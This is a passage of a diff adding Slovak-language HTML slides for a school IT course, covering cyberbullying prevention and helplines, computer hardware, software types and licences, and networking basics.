+    <div class="card bad"><h3>24/7</h3><p>Nekončí odchodom zo školy. Ide s obeťou domov, do postele, na dovolenku.</p></div>
+    <div class="card bad"><h3>Anonymita</h3><p>Útočník sa skryje za fake profil, preto si dovolí oveľa viac než tvárou v tvár.</p></div>
+    <div class="card bad"><h3>Veľké publikum</h3><p>Trápne video nevidí 20 spolužiakov, ale za hodinu celá škola aj cudzí ľudia.</p></div>
+    <div class="card bad"><h3>Nezmazateľnosť</h3><p>Screenshot je rýchlejší než mazanie. Čo raz vyjde von, ostáva na internete.</p></div>
+  </div>
+  <p class="small" style="margin-top:12px">⚖️ Kyberšikana nie je „len sranda na nete". Podľa Trestného zákona SR môže naplniť skutkovú podstatu <b>nebezpečného elektronického obťažovania (§ 360b)</b>, ohovárania, vydierania či šírenia detskej pornografie. Trestná zodpovednosť platí <b>od 14 rokov</b>.</p>
+</section>
+
+<section class="slide" data-sec="Kyberšikana">
+  <h2>Formy – ako to vyzerá naozaj</h2>
+  <div class="grid g3">
+    <div class="card bad"><h3>Flaming / hejt</h3><div class="ex"><b>Komentár:</b> „Kto ti dovolil sa vôbec ukázať? Zmizni z tejto školy, nikto ťa tu nechce."</div></div>
+    <div class="card bad"><h3>Vylúčenie zo skupiny</h3><div class="ex"><b>Ukážka:</b> celá trieda je v skupinovom chate, jeden je systematicky vyhodený a vzniká „druhá skupina" bez neho.</div></div>
+    <div class="card bad"><h3>Outing / šírenie súkromia</h3><div class="ex"><b>Ukážka:</b> súkromná správa poslaná kamarátke skončí ako screenshot v triednej skupine.</div></div>
+    <div class="card bad"><h3>Impersonácia</h3><div class="ex"><b>Ukážka:</b> niekto si založí profil s menom a fotkou obete a píše z neho urážky ostatným.</div></div>
+    <div class="card bad"><h3>Happy slapping</h3><div class="ex"><b>Ukážka:</b> spolužiaka niekto sotí, druhý to natáča a video ide na TikTok.</div></div>
+    <div class="card bad"><h3>Kyberstalking</h3><div class="ex"><b>Ukážka:</b> desiatky správ denne, sledovanie online statusu, komentár pod každou fotkou.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Kyberšikana">
+  <h2>Najnebezpečnejšie formy</h2>
+  <div class="grid g3">
+    <div class="card bad"><h3>🎣 Grooming</h3><p>Dospelý si pod falošnou identitou (často „rovesník") buduje dôveru dieťaťa s cieľom sexuálneho zneužitia alebo stretnutia.</p>
+      <div class="ex"><b>Varovný signál:</b> „Si dospelejšia ako ostatné." · „Toto nech ostane medzi nami." · rýchly presun do súkromného chatu.</div></div>
+    <div class="card bad"><h3>💣 Sextortion</h3><p>Vydieranie intímnou fotkou: „Pošli ďalšie, inak to uvidí celá škola." Platí pravidlo: <b>vydieračovi nikdy nevyhovieť</b>, ide o trestný čin.</p>
+      <div class="ex"><b>Riešenie:</b> nezmazať dôkazy, nahlásiť, kontaktovať políciu alebo <a href="https://stopline.sk" target="_blank">stopline.sk</a>.</div></div>
+    <div class="card bad"><h3>📍 Doxing</h3><p>Zverejnenie osobných údajov obete – adresa, číslo, škola, rodičia – aby ju mohli obťažovať aj ostatní.</p>
+      <div class="ex"><b>Prevencia:</b> neposielať adresu ani rozvrh cudzím, kontrolovať, čo je vidieť v pozadí fotiek.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Kyberšikana">
+  <h2>Čo robiť – a čo naopak nikdy</h2>
+  <div class="grid g2">
+    <div class="card good"><h3>✅ Čo urobiť</h3>
+      <ul class="bul" style="font-size:.94em">
+        <li><b>Neodpovedať.</b> Reakcia je presne to, čo útočník chce.</li>
+        <li><b>Uložiť dôkazy</b> – screenshot s dátumom, menom profilu, URL.</li>
+        <li><b>Zablokovať a nahlásiť</b> profil priamo v aplikácii.</li>
+        <li><b>Povedať to dospelému</b> – rodič, triedny, výchovný poradca.</li>
+        <li><b>Nastaviť súkromie</b> profilu na „len priatelia".</li>
+      </ul></div>
+    <div class="card bad"><h3>❌ Čo nerobiť</h3>
+      <ul class="bul" style="font-size:.94em">
+        <li><b>Nemazať správy</b> – zmizne jediný dôkaz.</li>
+        <li><b>Nevracať úder</b> urážkou – z obete sa stane spolupáchateľ.</li>
+        <li><b>Neplatiť</b> a neposielať ďalšie fotky vydieračovi.</li>
+        <li><b>Nemlčať.</b> Mlčanie je to jediné, čo šikanu udržiava.</li>
+        <li><b>Nezdieľať ďalej</b> cudzie trápne video – aj to je šírenie šikany.</li>
+      </ul></div>
+  </div>
+  <p class="small" style="margin-top:12px">📞 <b>Pomoc zadarmo a anonymne:</b> IPčko – linka <b>0800 500 333</b> a chat na ipcko.sk · Linka detskej istoty <b>116 111</b> · nahlásenie nezákonného obsahu: <b>stopline.sk</b></p>
+</section>
+
+<section class="slide" data-sec="Kyberšikana">
+  <h2>Cvičenie: rozhodni sa</h2>
+  <div class="card">
+    <h3 style="font-size:1.15em">Spolužiačke príde screenshot skupinového chatu, kde je terčom posmeškov jej kamarát. Priložené je aj jeho upravené foto. Čo urobiť ako prvé?</h3>
+    <div id="ksQ" style="margin-top:14px">
+      <button class="opt" data-ok="0">Napísať im do skupiny, nech s tým okamžite prestanú.</button>
+      <button class="opt" data-ok="0">Zmazať si Instagram, nech to nie je vidieť.</button>
+      <button class="opt" data-ok="1">Uložiť dôkazy aj s menami a URL a ukázať ich rodičovi alebo triednemu.</button>
+      <button class="opt" data-ok="0">Upraviť im tiež fotku a poslať to späť.</button>
+    </div>
+    <div class="fb" id="ksF"></div>
+  </div>
+</section>
+
+<!-- ============ HARDVÉR ============ -->
+<section class="slide divider" data-sec="Hardvér">
+  <div class="num">ČASŤ 03</div>
+  <h1>Hardvér</h1>
+  <p class="lead">Všetko, čoho sa dá dotknúť. Ak to spadne na zem a rozbije sa – bol to hardvér.</p>
+</section>
+
+<section class="slide" data-sec="Hardvér">
+  <h2>Ako počítač vlastne pracuje</h2>
+  <p class="lead">Každý počítač robí to isté v troch krokoch. Podľa toho sa delia aj jeho časti.</p>
+  <div class="net flow" style="margin:1em 0">
+    <div class="node act"><div class="ic">⌨️</div><div class="nm">VSTUP</div><p class="small">klávesnica, myš, mikrofón, skener, snímač</p></div>
+    <div class="arrow">→</div>
+    <div class="node act"><div class="ic">⚙️</div><div class="nm">SPRACOVANIE</div><p class="small">procesor + operačná pamäť</p></div>
+    <div class="arrow">→</div>
+    <div class="node act"><div class="ic">🖥️</div><div class="nm">VÝSTUP</div><p class="small">monitor, tlačiareň, reproduktory</p></div>
+    <div class="arrow">↕</div>
+    <div class="node act"><div class="ic">💾</div><div class="nm">UCHOVANIE</div><p class="small">SSD, HDD, USB kľúč, cloud</p></div>
+  </div>
+  <div class="card info"><b>Konkrétne:</b> stlačenie klávesu <code>A</code> (vstup) → procesor spracuje kód klávesy a podrží ho v RAM (spracovanie) → písmeno sa zobrazí na monitore (výstup) → po stlačení Ctrl+S sa uloží na SSD (uchovanie).</div>
+</section>
+
+<section class="slide" data-sec="Hardvér">
+  <h2>Procesor (CPU)</h2>
+  <div class="cycle" id="cpuCycle">
+    <span class="lb">Cyklus CPU</span>
+    <span class="st">1 · Načítaj inštrukciu</span><span class="ar">→</span>
+    <span class="st">2 · Dekóduj</span><span class="ar">→</span>
+    <span class="st">3 · Vykonaj</span><span class="ar">↻</span>
+  </div>
+  <div class="grid g2">
+    <div>
+      <p><b>Načo je:</b> mozog počítača. Vykonáva všetky výpočty a inštrukcie programov v cykle <b>načítaj → dekóduj → vykonaj</b> – miliardykrát za sekundu.</p>
+      <ul class="bul" style="margin-top:.7em">
+        <li><b>Frekvencia (GHz)</b> – koľko cyklov spraví za sekundu. 3,6 GHz = 3,6 miliardy.</li>
+        <li><b>Jadrá (cores)</b> – koľko úloh zvládne naozaj naraz. 6-jadrový robí 6 vecí súčasne.</li>
+        <li><b>Vlákna (threads)</b> – jedno jadro vie striedavo obsluhovať 2 úlohy.</li>
+        <li><b>Cache</b> – malá superrýchla pamäť priamo v procesore na najčastejšie dáta.</li>
+      </ul>
+    </div>
+    <div class="card info"><h3>Ako to čítať v obchode</h3>
+      <pre style="font-size:.82em">Intel Core i5-14400F
+       │    │  │
+       │    │  └ generácia a výkon
+       │    └─── trieda (i3/i5/i7/i9)
+       └──────── výrobca
+
+AMD Ryzen 5 7600X · 6 jadier
+· 12 vlákien · 4,7 GHz</pre>
+      <div class="ex t"><b>Pre odbor:</b> na CAD, strihanie videa a grafiku má zmysel viac jadier; na bežnú prácu a hry skôr vysoká frekvencia.</div>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Hardvér">
+  <h2>Operačná pamäť (RAM)</h2>
+  <div class="grid g2">
+    <div>
+      <p><b>Načo je:</b> dočasný pracovný stôl počítača. Beží v nej operačný systém a všetko, čo je práve otvorené. Je <b>rýchla, ale prchavá</b> – po vypnutí prúdu je prázdna.</p>
+      <div class="ramdemo">
+        <div class="mems">
+          <div class="mem"><h4>🧠 RAM (prchavá)</h4>
+            <div class="cells" id="ramCells">
+              <span class="cell">Word</span><span class="cell">foto.jpg</span><span class="cell">hra</span>
+              <span class="cell">chat</span><span class="cell">Windows</span>
+            </div></div>
+          <div class="mem"><h4>💾 SSD (trvalá)</h4>
+            <div class="cells">
+              <span class="cell disk">dokumenty</span><span class="cell disk">fotky</span>
+              <span class="cell disk">Windows</span><span class="cell disk">hry</span>
+            </div></div>
+        </div>
+        <div style="display:flex;gap:10px;align-items:center;margin-top:9px;flex-wrap:wrap">
+          <button class="btn" id="ramBtn" style="padding:8px 16px;font-size:.85em">⏻ Vypnúť prúd</button>
+          <span class="small" id="ramMsg">Kliknutím sa dá sledovať, čo sa stane s obsahom pamätí.</span>
+        </div>
+      </div>
+      <ul class="bul" style="margin-top:.8em">
+        <li><b>Kapacita:</b> 8 GB = základ, 16 GB = pohodlie, 32 GB = video / CAD / virtuálne stroje.<br>
+          <span class="small">CAD = navrhovanie a kreslenie objektov pomocou počítačových programov</span></li>
+        <li><b>Typ:</b> DDR4 / DDR5 – musí sedieť so základnou doskou.</li>
+        <li><b>Málo RAM</b> = systém odkladá dáta na disk (swap) a všetko sa spomalí.</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h3>RAM vs. SSD – najčastejší omyl</h3>
+      <table style="margin-top:.5em">
+        <tr><th></th><th>RAM</th><th>SSD/HDD</th></tr>
+        <tr><td>Účel</td><td>práca teraz</td><td>trvalé uloženie</td></tr>
+        <tr><td>Po vypnutí</td><td>vymaže sa</td><td>ostáva</td></tr>
+        <tr><td>Rýchlosť</td><td>~50 GB/s</td><td>0,5–7 GB/s</td></tr>
+        <tr><td>Veľkosť</td><td>8–32 GB</td><td>500 GB–4 TB</td></tr>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Hardvér">
+  <h2>Základná doska (motherboard)</h2>
+  <p class="lead">Chrbtica celej zostavy – plošný spoj, do ktorého sa zapája úplne všetko a cez ktorý si komponenty vymieňajú dáta.</p>
+  <div class="grid g2">
+    <svg class="mb" viewBox="0 0 520 340" role="img" aria-label="Schéma základnej dosky">
+      <rect x="8" y="8" width="504" height="324" rx="12" fill="#16233D" stroke="#0F1A2B" stroke-width="2"/>
+      <!-- trasy -->
+      <path d="M160 118 H206 M160 140 H206 M160 162 H206" stroke="#3E5180" stroke-width="1.5" stroke-dasharray="4 4"/>
+      <path d="M160 200 H330 V190" stroke="#3E5180" stroke-width="1.5" stroke-dasharray="4 4" fill="none"/>
+      <circle class="fdot" cx="163" cy="118" r="3.5" fill="#7EE0C6"/>
+      <circle class="fdot" cx="163" cy="140" r="3.5" fill="#7EE0C6"/>
+      <!-- I/O panel -->
+      <g class="part"><rect x="22" y="22" width="96" height="26" rx="4" fill="#3E5180"/>
+        <text x="70" y="39" text-anchor="middle" fill="#DFE7F5" font-size="10" font-family="Inter,sans-serif">I/O konektory</text></g>
+      <!-- napájanie -->
+      <g class="part"><rect x="426" y="22" width="64" height="26" rx="4" fill="#D98200"/>
+        <text x="458" y="39" text-anchor="middle" fill="#fff" font-size="10" font-family="Inter,sans-serif">napájanie</text></g>
+      <!-- socket -->
+      <g class="part"><rect x="42" y="78" width="118" height="112" rx="8" fill="#2743E0" fill-opacity=".45" stroke="#8FA0E6" stroke-width="2"/>
+        <text x="101" y="126" text-anchor="middle" fill="#fff" font-size="14" font-weight="600" font-family="Space Grotesk,sans-serif">SOCKET</text>
+        <text x="101" y="146" text-anchor="middle" fill="#C7D2EA" font-size="11" font-family="Inter,sans-serif">procesor (CPU)</text></g>
+      <!-- RAM sloty -->
+      <g class="part">
+        <rect x="212" y="46" width="11" height="150" rx="3" fill="#0E9E8F"/>
+        <rect x="230" y="46" width="11" height="150" rx="3" fill="#0E9E8F"/>
+        <rect x="248" y="46" width="11" height="150" rx="3" fill="#0E9E8F"/>
+        <rect x="266" y="46" width="11" height="150" rx="3" fill="#0E9E8F"/>
+        <text x="244" y="214" text-anchor="middle" fill="#C7D2EA" font-size="11" font-family="Inter,sans-serif">DIMM sloty – RAM</text></g>
+      <!-- čipset -->
+      <g class="part"><rect x="330" y="118" width="72" height="72" rx="6" fill="#D98200" fill-opacity=".85"/>
+        <text x="366" y="160" text-anchor="middle" fill="#fff" font-size="12" font-weight="600" font-family="Space Grotesk,sans-serif">Čipset</text></g>
+      <!-- BIOS -->
+      <g class="part"><rect x="424" y="118" width="66" height="34" rx="4" fill="#6F82D8"/>
+        <text x="457" y="140" text-anchor="middle" fill="#fff" font-size="10" font-family="Inter,sans-serif">BIOS/UEFI</text></g>
+      <!-- CMOS -->
+      <g class="part"><circle cx="457" cy="186" r="17" fill="#C7D2EA"/>
+        <text x="457" y="190" text-anchor="middle" fill="#16233D" font-size="9" font-weight="600" font-family="Inter,sans-serif">CMOS</text></g>
+      <!-- PCIe -->
+      <g class="part">
+        <rect x="42" y="232" width="248" height="13" rx="3" fill="#2743E0" fill-opacity=".75"/>
+        <rect x="42" y="256" width="248" height="13" rx="3" fill="#2743E0" fill-opacity=".55"/>
+        <rect x="42" y="280" width="180" height="13" rx="3" fill="#2743E0" fill-opacity=".55"/>
+        <text x="42" y="313" fill="#C7D2EA" font-size="11" font-family="Inter,sans-serif">PCIe sloty – grafická karta</text></g>
+      <!-- M.2 -->
+      <g class="part"><rect x="330" y="232" width="158" height="11" rx="3" fill="#0E9E8F" fill-opacity=".9"/>
+        <text x="330" y="262" fill="#C7D2EA" font-size="11" font-family="Inter,sans-serif">M.2 slot – SSD</text></g>
+    </svg>
+    <dl class="terms">
+      <dt>Socket</dt><dd>Pätica pre procesor. Určuje, ktoré CPU je vôbec možné použiť (LGA1700, AM5).</dd>
+      <dt>Sloty</dt><dd><b>DIMM</b> na RAM, <b>PCIe</b> na grafickú/sieťovú kartu, <b>M.2</b> na SSD.</dd>
+      <dt>Čipset</dt><dd>Riadi komunikáciu medzi procesorom, pamäťou a ostatnými zariadeniami.</dd>
+      <dt>BIOS / UEFI</dt><dd>Program v čipe dosky – spustí sa prvý, otestuje hardvér (POST) a naštartuje systém.</dd>
+      <dt>Konektory vzadu</dt><dd>USB, HDMI/DisplayPort, RJ-45 (sieť), jack na zvuk.</dd>
+      <dt>Batéria CMOS</dt><dd>Drží nastavenia BIOSu a čas, keď je PC odpojený. <span style="color:var(--amber)">Vybitá = PC po zapnutí ukazuje rok 2009.</span></dd>
+    </dl>
+  </div>
+</section>
+
+<section class="slide" data-sec="Hardvér">
+  <h2>Úložisko: HDD vs. SSD</h2>
+  <div class="grid g2">
+    <div class="card"><h3>💿 HDD (pevný disk)</h3><p>Mechanický – roztočené magnetické platne a pohyblivá čítacia hlava.</p>
+      <ul class="bul small" style="margin-top:.5em"><li>Lacný za GB, veľké kapacity</li><li>Pomalý, hlučný, citlivý na otras</li><li>Vhodný na archív, zálohy, filmy</li></ul></div>
+    <div class="card"><h3>⚡ SSD</h3><p>Bez pohyblivých častí – dáta v pamäťových čipoch (flash).</p>
+      <ul class="bul small" style="margin-top:.5em"><li>10–50× rýchlejší, tichý, odolný</li><li>SATA SSD ~550 MB/s, NVMe M.2 až 7000 MB/s</li><li>Vhodný na systém a programy</li></ul></div>
+  </div>
+  <div class="card info" style="margin-top:12px">
+    <b>Praktický dopad – štart Windowsu:</b> výmena HDD za SSD je najlacnejšie a najviditeľnejšie zrýchlenie staršieho notebooku (väčšie než pridanie RAM).
+    <div class="race">
+      <div class="lane"><span class="nm">HDD</span><span class="tr"><i id="hddBar" style="background:var(--amber)"></i></span><span class="t" id="hddT">0 s</span></div>
+      <div class="lane"><span class="nm">SSD</span><span class="tr"><i id="ssdBar" style="background:var(--teal)"></i></span><span class="t" id="ssdT">0 s</span></div>
+    </div>
+    <button class="btn" id="raceBtn" style="padding:8px 16px;font-size:.85em;margin-top:4px">▶ Spustiť pretek</button>
+    <span class="small" style="margin-left:8px">zrýchlené 15×</span>
+  </div>
+</section>
+
+<section class="slide" data-sec="Hardvér">
+  <h2>Grafická karta, zdroj, chladenie</h2>
+  <div class="grid g3">
+    <div class="card"><h3>🎮 GPU (grafická karta)</h3><p>Počíta obraz – 3D scény, video, efekty. Má vlastný procesor a vlastnú pamäť (VRAM).</p>
+      <div class="ex"><b>Kedy treba silnú:</b> hry, 3D modelovanie, strih videa, Photoshop/Illustrator s veľkými súbormi, trénovanie AI. Na písanie a internet stačí integrovaná v procesore.</div></div>
+    <div class="card"><h3>🔌 PSU (zdroj)</h3><p>Mení 230 V striedavých zo zásuvky na jednosmerné 12 V / 5 V / 3,3 V pre komponenty.</p>
+      <div class="ex"><b>Pozor:</b> poddimenzovaný alebo lacný zdroj = náhodné reštarty pri záťaži a v horšom prípade zničené súčiastky. Neušetri práve tu.</div></div>
+    <div class="card"><h3>❄️ Chladenie + skriňa</h3><p>Chladič a ventilátory odvádzajú teplo z CPU a GPU; teplovodivá pasta prenáša teplo z čipu na chladič.</p>
+      <div class="ex"><b>Prehriatie:</b> procesor sa sám spomalí (throttling) alebo PC vypne. Preto sa zaprášený notebook „seká" pri hrách.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Hardvér">
+  <h2>Periférne zariadenia</h2>
+  <div class="grid g3">
+    <div class="card good"><h3>Vstupné</h3><p>klávesnica · myš · touchpad · skener · mikrofón · webkamera · čítačka čiarových kódov · grafický tablet · herný volant</p></div>
+    <div class="card info"><h3>Výstupné</h3><p>monitor · tlačiareň · 3D tlačiareň · reproduktory · slúchadlá · projektor · plotter</p></div>
+    <div class="card warn"><h3>Vstupno-výstupné</h3><p>dotykový displej · sieťová karta · modem · USB kľúč · externý disk · multifunkčné zariadenie (tlač + skener)</p></div>
+  </div>
+  <div class="card" style="margin-top:12px"><b>Ako ich rozlíšiť:</b> rozhoduje smer, ktorým tečú dáta. <b>Do</b> počítača = vstupné. <b>Z</b> počítača k človeku = výstupné. Oboma smermi = vstupno-výstupné.</div>
+</section>
+
+<section class="slide" data-sec="Hardvér">
+  <h2>Cvičenie: priraď komponent k funkcii</h2>
+  <p class="small" style="margin-bottom:10px">Kliknúť na názov komponentu a potom na riadok s jeho funkciou. (Klik na obsadený riadok ho uvoľní.)</p>
+  <div class="pool" id="hwPool"></div>
+  <div id="hwZones"></div>
+  <div style="display:flex;gap:10px;align-items:center;margin-top:12px">
+    <button class="btn" id="hwCheck">Vyhodnotiť</button>
+    <button class="btn ghost" id="hwReset">Znova</button>
+    <span id="hwOut" style="font-weight:600"></span>
+  </div>
+</section>
+
+<!-- ============ SOFTVÉR ============ -->
+<section class="slide divider" data-sec="Softvér">
+  <div class="num">ČASŤ 04</div>
+  <h1>Softvér</h1>
+  <p class="lead">Sada inštrukcií, ktorá povie hardvéru, čo má robiť. Bez nej je počítač drahá kopa kovu.</p>
+</section>
+
+<section class="slide" data-sec="Softvér">
+  <h2>Firmvér – systémový – aplikačný</h2>
+  <div class="grid g3">
+    <div class="card"><h3>1 · Firmvér</h3><p>Program uložený priamo v čipe zariadenia, „na pomedzí" hardvéru a softvéru.</p>
+      <div class="ex"><b>Kde ho nájsť:</b> BIOS/UEFI na základnej doske, softvér v routri, v práčke, v riadiacej jednotke auta (ECU), v tlačiarni.</div></div>
+    <div class="card"><h3>2 · Systémový softvér</h3><p>Riadi samotný počítač a vytvára prostredie pre aplikácie.</p>
+      <div class="ex"><b>Patrí sem:</b> operačný systém, ovládače (drivery), antivírus, zálohovacie a diagnostické nástroje, kompresné programy.</div></div>
+    <div class="card"><h3>3 · Aplikačný softvér</h3><p>To, čo používaš na konkrétnu prácu.</p>
+      <div class="ex"><b>Patrí sem:</b> Word, Excel, prehliadač, Photoshop, AutoCAD, hry, Spotify, mobilné appky.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Softvér">
+  <h2>Operačný systém a ovládače</h2>
+  <div class="grid g2">
+    <div>
+      <h3>Čo robí operačný systém</h3>
+      <ul class="bul" style="margin-top:.4em">
+        <li><b>Riadi procesor a pamäť</b> – rozdeľuje výkon medzi bežiace programy.</li>
+        <li><b>Spravuje súbory</b> – priečinky, práva, súborový systém (NTFS, exFAT, ext4).</li>
+        <li><b>Obsluhuje zariadenia</b> cez ovládače.</li>
+        <li><b>Rieši používateľov a bezpečnosť</b> – účty, heslá, oprávnenia.</li>
+        <li><b>Poskytuje rozhranie</b> – grafické (GUI) alebo príkazový riadok (CLI).</li>
+      </ul>
+      <div class="ex t" style="margin-top:.7em"><b>Príklady:</b> Windows 11 · macOS · Linux (Ubuntu, Debian) · Android · iOS</div>
+    </div>
+    <div class="card info">
+      <h3>Ovládač (driver)</h3>
+      <p>Prekladateľ medzi operačným systémom a konkrétnym kusom hardvéru. OS povie „vytlač stranu", ovládač to preloží do reči presne tejto tlačiarne.</p>
+      <div class="ex"><b>Spoznať sa to dá takto:</b> po preinštalovaní Windowsu je rozlíšenie 1024×768 a nefunguje zvuk ani Wi-Fi – hardvér je v poriadku, len chýbajú ovládače.</div>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Softvér">
+  <h2>Licencie – čo je dovolené a čo nie</h2>
+  <table>
+    <tr><th>Typ</th><th>Čo znamená</th><th>Príklad</th></tr>
+    <tr><td><b>Proprietárny (komerčný)</b></td><td>Platí sa zaň, kód je tajný, nesmie sa meniť ani ďalej šíriť</td><td>Windows, Adobe CC, AutoCAD</td></tr>
+    <tr><td><b>Freeware</b></td><td>Zadarmo, ale bez zdrojového kódu</td><td>Skype, Adobe Reader, VLC balíky</td></tr>
+    <tr><td><b>Shareware / trial</b></td><td>Zdarma na obmedzený čas alebo s obmedzením, potom sa platí</td><td>WinRAR, 30-dňové verzie</td></tr>
+    <tr><td><b>Open source</b></td><td>Kód je verejný, smie sa študovať, upravovať a šíriť (GPL, MIT)</td><td>Linux, GIMP, Blender, LibreOffice</td></tr>
+    <tr><td><b>Freemium / predplatné</b></td><td>Základ zadarmo, plná verzia za mesačný poplatok</td><td>Spotify, Canva, Microsoft 365</td></tr>
+    <tr><td><b>Nelegálny softvér</b></td><td>Crack, keygen, „aktivátor" – porušenie autorského práva + typický nosič malvéru</td><td>—</td></tr>
+  </table>
+  <p class="small" style="margin-top:10px">🎓 Študenti majú často nárok na bezplatné licencie: Microsoft 365 cez školu, Autodesk Education, JetBrains Student Pack.</p>
+</section>
+
+<section class="slide" data-sec="Softvér">
+  <h2>Živá ukážka: softvér je len text, ktorý sa vykoná</h2>
+  <p class="lead">Tento kód beží priamo v prehliadači. Po úprave a stlačení <b>Spusti</b> je vidieť, čo procesor s inštrukciami urobí.</p>
+  <div class="grid g2">
+    <div>
+      <textarea id="code">// Program: vyhodnoť silu hesiel v zozname
+let hesla = ["heslo123", "Zilina2024", "modrykonPijeCaj7"];
+
+for (let h of hesla) {
+  let dlzka = h.length;
+  let stav = dlzka >= 12 ? "SILNE" : "SLABE";
+  print(h + "  (" + dlzka + " znakov) -> " + stav);
+}</textarea>
+      <button class="btn" id="runBtn" style="margin-top:8px">▶ Spusti</button>
+    </div>
+    <div><div class="out" id="out">Výstup sa zobrazí tu…</div>
+      <p class="small" style="margin-top:8px">Skúsiť zmeniť hranicu z <code>12</code> na <code>8</code> alebo pridať do zoznamu ďalšie heslo.</p></div>
+  </div>
+</section>
+
+<!-- ============ SIETE ============ -->
+<section class="slide divider" data-sec="Siete">
+  <div class="num">ČASŤ 05</div>
+  <h1>Počítačové siete</h1>
+  <p class="lead">Prepojenie zariadení, ktoré si vymieňajú dáta a zdieľajú zdroje. Internet je len najväčšia z nich.</p>
+</section>
+
+<section class="slide" data-sec="Siete">
+  <h2>Delenie sietí podľa rozsahu</h2>
+  <div class="grid g4">
+    <div class="card"><h3>PAN</h3><p>Osobná, do pár metrov.</p><div class="ex"><b>Príklad:</b> Bluetooth slúchadlá a hodinky spárované s mobilom.</div></div>
+    <div class="card"><h3>LAN</h3><p>Lokálna – budova, škola, firma.</p><div class="ex"><b>Príklad:</b> počítače v učebni + sieťová tlačiareň + školský server.</div></div>
+    <div class="card"><h3>MAN</h3><p>Mestská, prepája viac LAN v rámci mesta.</p><div class="ex"><b>Príklad:</b> prepojené pobočky mestského úradu optikou.</div></div>
+    <div class="card"><h3>WAN</h3><p>Rozľahlá, cez krajiny a kontinenty.</p><div class="ex"><b>Príklad:</b> internet – najväčšia WAN na svete.</div></div>
+  </div>
+  <div class="card info" style="margin-top:12px"><b>Načo sieť vlastne je:</b> zdieľanie internetu · zdieľanie súborov a tlačiarne · centrálne zálohovanie · spoločné aplikácie a databázy · komunikácia (mail, chat, videohovor).</div>
+</section>
+
+<section class="slide" data-sec="Siete">
+  <h2>Zariadenia v sieti a načo slúžia</h2>
+  <div class="grid g3">
+    <div class="card"><h3>🔀 Switch (prepínač)</h3><p>Spája zariadenia v rámci jednej LAN. Podľa MAC adresy pošle dáta <b>len</b> tomu počítaču, ktorému patria.</p></div>
+    <div class="card"><h3>🌐 Router (smerovač)</h3><p>Spája dve rôzne siete – domácu s internetom. Vyberá cestu paketu a robí preklad adries (NAT).</p></div>
+    <div class="card"><h3>📶 Access Point</h3><p>Rozširuje sieť o Wi-Fi. V domácnostiach býva router + switch + AP v jednej krabičke.</p></div>
+    <div class="card"><h3>📡 Modem</h3><p>Prevádza digitálny signál na signál linky poskytovateľa (DSL, kábel, optika) a späť.</p></div>
+    <div class="card"><h3>🔌 Sieťová karta (NIC)</h3><p>Rozhranie priamo v PC – konektor RJ-45 alebo Wi-Fi modul. Nesie <b>MAC adresu</b>.</p></div>
+    <div class="card"><h3>🧵 Médium</h3><p>UTP kábel (RJ-45, do 100 m), optika (rýchla, na veľké vzdialenosti), alebo bezdrôtovo cez rádiové vlny.</p></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Siete">
+  <h2>Adresy: IP vs. MAC</h2>
+  <div class="grid g2">
+    <div class="card info"><h3>IP adresa</h3><p>Logická adresa v sieti – dá sa zmeniť, prideľuje ju router (DHCP). Ako adresa bydliska.</p>
+      <pre style="font-size:.8em">IPv4:  <span class="s">192.168.1.14</span>   (4 čísla 0–255)
+IPv6:  <span class="s">2001:0db8::7334</span>
+
+<span class="c">privátne (len doma/v škole):</span>
+192.168.x.x · 10.x.x.x · 172.16–31.x.x
+<span class="c">verejná = tá, ktorú vidí internet</span></pre>
+      <div class="ex"><b>Vyskúšať v termináli:</b> <code>ipconfig</code> (Windows) alebo <code>ip a</code> (Linux).</div></div>
+    <div class="card"><h3>MAC adresa</h3><p>Fyzická adresa sieťovej karty – zapísaná od výroby, celosvetovo jedinečná. Ako rodné číslo zariadenia.</p>
+      <pre style="font-size:.8em">MAC:  <span class="s">A4:5E:60:1B:7C:D2</span>
+      6 dvojíc v šestnástkovej sústave</pre>
+      <div class="ex"><b>Použitie:</b> switch podľa nej doručuje rámce v LAN; správca ňou vie povoliť len konkrétne zariadenia do Wi-Fi.</div>
+      <div class="ex t"><b>Rozdiel v jednej vete:</b> IP hovorí <i>kde</i> si, MAC hovorí <i>kto</i> si.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Siete">
+  <h2>Simulácia: čo sa stane po zadaní adresy</h2>
+  <p class="lead">Po zadaní domény a spustení sa ukáže celá cesta od klávesnice po zobrazenú stránku.</p>
+  <div style="display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap">
+    <input type="text" id="url" value="www.spsza.sk" style="max-width:320px">
+    <button class="btn" id="netRun">▶ Načítať stránku</button>
+  </div>
+  <div class="net" id="netNodes">
+    <div class="node" data-i="0"><div class="ic">💻</div><div class="nm">PC používateľa</div></div><div class="arrow">→</div>
+    <div class="node" data-i="1"><div class="ic">🌐</div><div class="nm">Router</div></div><div class="arrow">→</div>
+    <div class="node" data-i="2"><div class="ic">📖</div><div class="nm">DNS server</div></div><div class="arrow">→</div>
+    <div class="node" data-i="3"><div class="ic">🏢</div><div class="nm">Web server</div></div><div class="arrow">→</div>
+    <div class="node" data-i="4"><div class="ic">🖥️</div><div class="nm">Prehliadač</div></div>
+  </div>
+  <div class="log" id="netLog">Čakám na spustenie…</div>
+</section>
+
+<section class="slide" data-sec="Siete">
+  <h2>Protokoly – pravidlá komunikácie</h2>
+  <div class="grid g2">
+    <div>
+      <table>
+        <tr><th>Protokol</th><th>Port</th><th>Na čo</th></tr>
+        <tr><td><b>HTTP</b></td><td>80</td><td>web – prenos <b>nešifrovane</b></td></tr>
+        <tr><td><b>HTTPS</b></td><td>443</td><td>web šifrovane (TLS)</td></tr>
+        <tr><td><b>FTP</b></td><td>21</td><td>prenos súborov na server</td></tr>
+        <tr><td><b>SMTP / IMAP</b></td><td>25 / 143</td><td>odosielanie / čítanie pošty</td></tr>
+        <tr><td><b>DNS</b></td><td>53</td><td>preklad mena na IP</td></tr>
+        <tr><td><b>DHCP</b></td><td>67</td><td>automatické pridelenie IP</td></tr>
+      </table>
+    </div>
+    <div class="card warn"><h3>HTTP vs HTTPS v praxi</h3>
